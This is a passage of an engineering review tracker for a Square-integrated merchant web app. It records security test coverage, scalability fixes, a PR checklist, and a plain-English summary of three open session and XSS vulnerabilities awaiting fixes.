- ✅ Generic error messages (no internal details)
- ✅ Payment declined handling (CARD_DECLINED, INSUFFICIENT_FUNDS, generic errors)
- ✅ Payment decline logging for debugging
- ✅ Refund idempotency key generation
- ✅ Refund eligibility checks (completed + non-refunded only)
- ✅ Refund marking and audit trail
- ✅ Square refund API failure handling
- ✅ Subscription cancellation after refund

---

### P2-3: Webhook Signature Verification Tests ✅ COMPLETE
**File**: `__tests__/security/webhook-signature.test.js` (332 lines)
**Status**: COMPLETE (2026-01-26 review)

**All required tests exist**:
- ✅ HMAC-SHA256 signature validation
- ✅ Rejects invalid signature
- ✅ Rejects tampered payload
- ✅ Signature sensitive to URL changes (prevents host injection)
- ✅ Signature sensitive to key changes
- ✅ Production/development mode handling
- ✅ Duplicate event detection (idempotency)
- ✅ Merchant isolation
- ✅ Security edge cases (missing header, empty header, malformed JSON, large payloads)

---

### P2-4: Authentication Edge Case Tests 🟡 PARTIAL
**Files**:
- `__tests__/middleware/auth.test.js` (584 lines)
- `__tests__/routes/auth.test.js` (47 tests)
**Status**: TESTS EXIST but don't verify actual implementation

**⚠️ TEST GAP DISCOVERED (Master Engineering Review 2026-01-26)**:
- Test at `auth.test.js:557` ("regenerates session ID on login") uses a **mock** session object
- The test passes because it tests `mockSession.regenerate()` being called
- **BUT** the actual `routes/auth.js` login handler does NOT call `req.session.regenerate()`
- This is a false-positive test - documents the requirement but doesn't verify implementation

**Tests that exist**:
- ✅ requireAuth, requireAuthApi, requireAdmin, requireRole
- ✅ requireWriteAccess, optionalAuth, getCurrentUser
- ✅ getClientIp (x-forwarded-for, x-real-ip, etc.)
- ✅ Session with null/undefined user
- ✅ Missing role property
- ✅ Case-sensitive role matching
- ✅ Session expiry handling
- ⚠️ Session fixation attack prevention (test mocks, doesn't verify real code - **SEE P0-6**)
- ⚠️ Session ID regeneration on login (test mocks, doesn't verify real code - **SEE P0-6**)
- ✅ Secure session cookie configuration
- ✅ Session does not contain sensitive data
- ⚠️ Complete session destruction on logout (cookie name wrong - **SEE P0-5**)
- ✅ Account lockout after failed attempts
- ✅ User enumeration prevention

**Action Required**: After fixing P0-5 and P0-6, add integration tests that verify actual behavior.

Note: Login rate limiting tested in `security.test.js`

---

### P2-5: OAuth Token Refresh Tests ✅ COMPLETE
**File**: `__tests__/security/oauth-csrf.test.js` (41 tests)
**Status**: COMPLETE (2026-01-26)

**All required tests exist**:
- ✅ State parameter generation (256 bits entropy)
- ✅ State storage with expiry (10 minutes)
- ✅ State validation (expired, used, unknown)
- ✅ CSRF attack prevention (state tied to user)
- ✅ Token encryption before storage
- ✅ Tokens not logged in plain text
- ✅ OAuth configuration validation
- ✅ Proactive token refresh (within 1 hour of expiry)
- ✅ Token refresh storage and logging
- ✅ Missing refresh token handling
- ✅ Square API refresh error handling
- ✅ Expired refresh token requiring re-authorization
- ✅ Network error handling during refresh
- ✅ Authentication error non-retry logic
- ✅ Merchant deactivation on permanent refresh failure
- ✅ oauth.authorization.revoked webhook handling
- ✅ Revocation logging and token clearing
- ✅ 401 response for revoked tokens
- ✅ Re-authorization flow after revocation

---

### P2-6: Rate Limiter Effectiveness Tests ✅ COMPLETE
**File**: `__tests__/middleware/security.test.js` (504 lines)
**Status**: COMPLETE (2026-01-26 review)

**All required tests exist**:
- ✅ General rate limit (100/15min default)
- ✅ Login rate limit (5/15min)
- ✅ Delivery rate limit (30/min)
- ✅ Sensitive operation rate limit (5/hour)
- ✅ 429 status with RATE_LIMITED code
- ✅ Key generation (user ID, IP, merchant ID)
- ✅ Health check endpoint skip
- ✅ Environment variable overrides
- ✅ Logging rate limit violations
- ✅ CORS configuration
- ✅ Helmet security headers (CSP, clickjacking, HSTS)

---

## P3: Scalability Prep (OPTIONAL for Single Business)

These are only required if pursuing multi-merchant SaaS revenue.

### P3-1: In-Memory State Doesn't Scale
**File**: `services/sync-queue.js`
**Issue**: Sync state is in-memory + DB, but multiple instances will have different in-memory state

**Fix for Scale**: Use Redis for shared state
```javascript
const Redis = require('ioredis');
const redis = new Redis(process.env.REDIS_URL);

async function getSyncState(merchantId, syncType) {
    return redis.get(`sync:${merchantId}:${syncType}`);
}
```

### P3-2: Cron Jobs Run on Every Instance
**File**: `jobs/cron-scheduler.js`
**Issue**: Each server instance runs all cron jobs

**Fix for Scale**: Use distributed job queue (Bull, Agenda)
```javascript
const Queue = require('bull');
const syncQueue = new Queue('sync', process.env.REDIS_URL);

// Only one worker processes each job
syncQueue.process(async (job) => {
    await runSmartSync(job.data.merchantId);
});
```

### P3-3: No Per-Tenant Rate Limiting for Square API
**Issue**: Square has rate limits (~30 req/sec). Multiple merchants will collide.

**Fix for Scale**: Implement per-merchant request queue with backoff

### P3-4: Single Database Pool for All Tenants
**Issue**: 20 connections shared across all merchants

**Fix for Scale**: Consider tenant-aware pooling or connection limits per merchant

---

## Previous Achievements (2026-01-26)

These items are COMPLETE and should not regress:

- ✅ server.js: 3,057 → 1,023 lines (66% reduction)
- ✅ All 246 routes use asyncHandler
- ✅ Webhook processing modularized (6 handlers)
- ✅ Cron jobs extracted to jobs/ directory
- ✅ Composite indexes added for multi-tenant queries
- ✅ N+1 queries eliminated
- ✅ Transactions added to critical operations
- ✅ Sync queue state persisted to database
- ✅ API versioning added (/api/v1/*)
- ✅ pg_dump secured (spawn with env password)
- ✅ Parameterized queries: 100% coverage
- ✅ Token encryption: AES-256-GCM
- ✅ Password hashing: bcrypt with 12 rounds
- ✅ Multi-tenant isolation: merchant_id on all queries
- ✅ Modern loyalty service built (`services/loyalty/`) with 2,931 lines of tests
- ✅ P0-1, P0-2, P0-3 security fixes applied

---

## PR Checklist

Before merging any PR:

- [ ] No new security vulnerabilities (P0 items)
- [ ] No N+1 queries introduced
- [ ] asyncHandler used (no manual try/catch in routes)
- [ ] Error logs include stack traces (server-side only)
- [ ] Error responses don't expose internal details
- [ ] Multi-step operations use transactions
- [ ] Tests added for new functionality
- [ ] Validators in `middleware/validators/`, not inline
- [ ] Business logic in services, not routes
- [ ] merchant_id filter on ALL database queries

---

## Quick Reference: Grade Requirements

| Grade | P0 | P1 | P2 | P3 |
|-------|----|----|----|----|
| A++ | 7/7 ✅ | 9/9 ✅ | 6/6 ✅ | Optional |
| A+ | 7/7 ✅ | 7/9 ✅ | 5/6 ✅ | - |
| A | 7/7 ✅ | 5/9 🟡 | 5/6 ✅ | - |
| B+ (Current) | 4/7 🔴 | 5/9 🟡 | 5.5/6 🟡 | - |

---

## Executive Summary for Non-Technical Stakeholders

### What This Means (Plain English)

**Current State**: The application has **3 critical security vulnerabilities** that must be fixed before real users can safely use it.

**The Good News**:
- Database security is excellent (no SQL injection, proper encryption)
- Multi-tenant isolation works (users can't see other merchants' data)
- Password hashing is industry-standard (bcrypt, 12 rounds)
- API tokens are properly encrypted (AES-256-GCM)
- 23 test files with good coverage of business logic

**The Bad News (Must Fix)**:

1. **Logout Doesn't Work Properly** (P0-5)
   - *What*: When users click "Logout", the session cookie isn't actually cleared
   - *Risk*: If someone steals a logged-in user's cookie, they stay logged in forever even after the user "logs out"
   - *Fix*: 1 line of code change

2. **Login Can Be Hijacked** (P0-6)
   - *What*: The session ID doesn't change when someone logs in
   - *Risk*: An attacker can pre-set a session ID, trick someone into logging in, then use that same session ID to become them
   - *Fix*: ~10 lines of code change

3. **Error Messages Can Run Malicious Code** (P0-7)
   - *What*: Error messages are displayed without sanitization in 13 pages
   - *Risk*: An attacker could inject JavaScript that steals login cookies when error messages appear
   - *Fix*: ~25 places need `escapeHtml()` wrapper added

### Priority Order

| Priority | Items | Time Estimate | Blocked? |
|----------|-------|---------------|----------|
| **Fix First** | P0-5 (1 line), P0-6 (~10 lines) | 1-2 hours | Blocks production |
| **Fix Second** | P0-7 (25 locations) | 2-3 hours | Blocks production |
| **Fix Third** | P1-7, P1-9 (error messages) | 2-3 hours | Should fix before production |
| **Then** | P1-6, P1-8 (validators, rate limits) | 1-2 hours | Nice to have |

### What "Production Ready" Means

Before allowing real merchants with real customer data:
- [x] SQL injection protection (done)
- [x] Password encryption (done)
- [x] Token encryption (done)
- [x] Multi-tenant isolation (done)
- [ ] Session security (P0-5, P0-6)
- [ ] XSS protection (P0-7)
- [ ] Complete error message sanitization (P1-9)

**Estimated time to production-ready: 6-10 hours of focused work**
